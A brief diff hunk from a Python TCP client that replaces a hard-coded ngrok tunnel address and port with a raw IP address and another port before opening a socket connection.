@@ -401,8 +401,8 @@ def close_program(clientSocket: socket) -> None:
 
 def main():
     try:
-        serverName = '0.tcp.eu.ngrok.io' # ======================================================================================================================
-        serverPort = 10253
+        serverName = '145.241.187.87'
+        serverPort = 14532
         clientSocket = socket(AF_INET, SOCK_STREAM)
         clientSocket.connect((serverName, serverPort))
         while True:
